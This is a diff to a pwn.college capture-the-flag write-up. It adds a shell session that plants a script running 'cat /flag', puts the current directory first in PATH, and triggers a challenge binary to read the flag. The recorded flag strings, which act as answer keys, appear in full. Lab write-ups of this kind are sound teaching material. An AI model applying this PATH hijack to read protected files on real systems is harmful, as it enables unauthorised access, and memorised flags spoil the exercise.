@@ -30,11 +30,16 @@ This returned the flag **pwn.college{ULdeZxbkms5EinqrLQkkfeI3Zpk.dVzNyUDLyQzN0cz
 # Adding Commands
 ## Code
 ```
-
+hacker@path~adding-commands:~$ echo "cat /flag" > win
+hacker@path~adding-commands:~$ chmod a=rwx win
+hacker@path~adding-commands:~$ export PATH=$(pwd):$PATH
+hacker@path~adding-commands:~$ /challenge/run
+Invoking 'win'....
+pwn.college{AoY1EHS2i3iSMsbkZF6CJN1T-4o.dZzNyUDLyQzN0czW}
 ```
 ## Approach
 .<br>
-This returned the flag ****
+This returned the flag **pwn.college{AoY1EHS2i3iSMsbkZF6CJN1T-4o.dZzNyUDLyQzN0czW}**
 ## Learning
 
 # Hijacking Commands
